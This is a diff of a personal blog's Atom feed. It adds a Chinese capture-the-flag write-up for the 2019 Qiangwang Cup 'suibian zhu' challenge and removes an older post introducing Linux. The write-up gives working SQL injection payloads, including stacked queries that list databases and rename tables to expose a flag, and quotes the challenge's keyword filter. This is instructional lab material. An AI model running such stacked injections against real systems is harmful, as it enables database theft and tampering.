@@ -6,7 +6,7 @@
   <link href="http://jacen-cpu.github.io/atom.xml" rel="self"/>
   
   <link href="http://jacen-cpu.github.io/"/>
-  <updated>2021-07-21T12:49:31.815Z</updated>
+  <updated>2021-07-22T03:32:31.775Z</updated>
   <id>http://jacen-cpu.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2019强网杯随便注</title>
+    <link href="http://jacen-cpu.github.io/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
+    <id>http://jacen-cpu.github.io/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
+    <published>2021-07-22T01:19:52.000Z</published>
+    <updated>2021-07-22T03:32:31.775Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>打开题目，显然是<code>SQL注入</code>，试一试常用的注入手法，发现参数使用单引号闭合。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1 # 返回值有</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 无返回值</span><br></pre></td></tr></table></figure><p>接着我们用<code>order by</code>探测列数。发现当前的tables是两列。</p><p>我们试着用<code>union</code>查询看一下,这里我们发现报错。</p><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_10-29-54.png" class=""><p><code>/select|update|delete|drop|insert|where|\./i</code>普通的注入和报错注入都用不了哎。</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的<code>sql</code>语句了。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>极为苛刻，容易受到<code>API</code>，或者数据库引擎，权限的限制。只有当调用数据库函数支持执行多条<code>sql</code>语句时才能够使用。</p><h2 id="利用堆叠注入"><a href="#利用堆叠注入" class="headerlink" title="利用堆叠注入"></a>利用堆叠注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_10-48-50.png" class=""><p>成功注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_10-48-50.png" class=""><p>发现table。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></table></figure><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_11-03-10.png" class=""><p>发现flag的列。</p><p>因为我们用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 # </span></span><br></pre></td></tr></table></figure><p>发现words是当前表。</p><p>下面我们修改表名和列名，以便爆出表1919810931114514中的数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words rename <span class="keyword">to</span> words1; <span class="keyword">alter</span> <span class="keyword">table</span> `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> words;</span><br></pre></td></tr></table></figure><p>修改列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words change flag id <span class="type">varchar</span>(<span class="number">50</span>);</span><br></pre></td></tr></table></figure><p>最终我们的playload为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; alter table words rename to words1; alter table `1919810931114514` rename to words; alter table words change flag id varchar(50); #</span></span><br></pre></td></tr></table></figure><p>这时我们再用<code>1&#39; or 1=1 # </code>得到flag</p><img src="/2021/07/22/2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9A%8F%E4%BE%BF%E6%B3%A8/Snipaste_2021-07-22_11-23-55.png" class="">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;随便注&quot;&gt;&lt;a href=&quot;#随便注&quot; class=&quot;headerlink&quot; title=&quot;随便注&quot;&gt;&lt;/a&gt;随便注&lt;/h1&gt;&lt;p&gt;打开题目，显然是&lt;code&gt;SQL注入&lt;/code&gt;，试一试常用的注入手法，发现参数使用单引号闭合。&lt;/p&gt;
+&lt;figure cla</summary>
+      
+    
+    
+    
+    <category term="buu_writeup" scheme="http://jacen-cpu.github.io/categories/buu-writeup/"/>
+    
+    
+    <category term="强网杯" scheme="http://jacen-cpu.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
+    
+  </entry>
   
   <entry>
     <title>SQL盲注脚本</title>
@@ -427,32 +452,6 @@
     
     <category term="Linux" scheme="http://jacen-cpu.github.io/categories/Linux/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>Linux到底是什么</title>
-    <link href="http://jacen-cpu.github.io/2021/02/13/Linux%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/"/>
-    <id>http://jacen-cpu.github.io/2021/02/13/Linux%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/</id>
-    <published>2021-02-13T10:25:33.000Z</published>
-    <updated>2021-04-08T23:52:27.813Z</updated>
-    
-    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/> <h2 id="Linux起源"><a href="#Linux起源" class="headerlink" title="Linux起源"></a>Linux起源</h2><p>Linux全称<strong>GNU/Linux</strong> （这很重要），它是一种类UNIX的操作系统，其内核是由<strong>林纳斯·本纳第克特·托瓦兹</strong>（Linus Benedict Torvalds，1969年12月28日- ）写的。</p><p><img src="https://bkimg.cdn.bcebos.com/pic/5882b2b7d0a20cf4f664615276094b36adaf9943?x-bce-process=image/resize,m_lfit,w_268,limit_1/format,f_jpg"></p><p>20世纪80年代，当时可供计算机选用的操作系统主要有Unix。但是它并不是面向我们这些普通人的，Unix主要的用户仅仅是那些大厂，大公司。但这时林纳斯站出来了，他在大学里仅仅花了一年的时间就开发出了Linux的内核，并使之开源。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统 。</p><h2 id="Linux的各种发行版"><a href="#Linux的各种发行版" class="headerlink" title="Linux的各种发行版"></a>Linux的各种发行版</h2><p>Linux有上百种不同的发行版 。列如（Ubuntu, CenntOS, RedHat, Kail…）。就好像安卓有华为，小米， oppo, vivo。</p><h3 id="主流发行版"><a href="#主流发行版" class="headerlink" title="主流发行版"></a>主流发行版</h3><ul><li>Debian(其派生版本有Ubuntu, Linux Mint, Kail)</li><li>Fedore(其派生版本有RedHat, CentOS, Xange, Yellow Dog Linux)</li><li>openSUSE(其派生版本有SUSE Linux Enterprise )</li></ul><h2 id="Linux的四大组成部分"><a href="#Linux的四大组成部分" class="headerlink" title="Linux的四大组成部分"></a>Linux的四大组成部分</h2><ol><li>Linux Kernel 内核</li><li>GNU工具 GNU<em>（GNU’s Not Unix! ）</em></li><li>GUI Desktop环境</li><li>Application 应用</li></ol><h2 id="GUI和GNU-Linux的系统组成"><a href="#GUI和GNU-Linux的系统组成" class="headerlink" title="GUI和GNU-Linux的系统组成"></a>GUI和GNU-Linux的系统组成</h2><p>有关Linux的系统组成，请参阅下面的思维导图。</p><img src="/2021/02/13/Linux%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/Snipaste_2021-02-13_19-00-56.png" class="" title="This is an example image"><h2 id="Linux内核"><a href="#Linux内核" class="headerlink" title="Linux内核"></a>Linux内核</h2><ol><li>硬件设备 管理使用</li><li>软件程序 (系统) -&gt; 操作软件</li><li>系统内存</li><li>文件管理（保存文件， 删除文件， 修改文件）</li></ol><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>简单的来讲文件系统就是文件读和写的标准。</p><blockquote><p>linux支持的文件系统类型：ext, ext2, ext3, <strong>ext4</strong>, hpfs, isp9660, JFS…</p></blockquote><blockquote><p>Windows支持的文件系统类型： FAT32, NTFS, exFAT</p></blockquote><p><em>不同类型的文件系统产生不同的效果</em> 。</p><h2 id="GNU"><a href="#GNU" class="headerlink" title="GNU"></a>GNU</h2><h4 id="GNU组织"><a href="#GNU组织" class="headerlink" title="GNU组织"></a>GNU组织</h4><p>Unix上具有的一些软件，Linux内核本身没有，所以GNU就模仿Unix，为Linux写了一些必要的软件。</p><h4 id="GNU核心"><a href="#GNU核心" class="headerlink" title="GNU核心"></a>GNU核心</h4><p><strong>coreutils</strong></p><p>它是供Linux使用的工具。它有三个组成。</p><ol><li>用来处理文件的工具</li><li>用来操作文本的工具</li><li>用来管理进程的工具</li></ol><p><strong>shell</strong></p><p>它是提供给用户使用的软件： 用户拿它来使用电脑，并且与电脑交互。</p><p>shell(命令行壳层)提供一个命令行界面(CLI); 而图形壳层提供一个图形用户界面(GUI)。</p><p>bash shell 基础shell</p><p>其他的shell: zsh, ash, korn,  tcsh</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt; 
-
-&lt;h2 id=&quot;Linux起源&quot;&gt;&lt;a href=&quot;#Linux起源&quot; class=&quot;headerlink&quot; title=&quot;Linux起源&quot;&gt;&lt;/a&gt;Linux起源&lt;/h2&gt;&lt;p&gt;Li</summary>
-      
-    
-    
-    
-    <category term="Linux" scheme="http://jacen-cpu.github.io/categories/Linux/"/>
-    
-    
-    <category term="操作系统" scheme="http://jacen-cpu.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
     
   </entry>
   
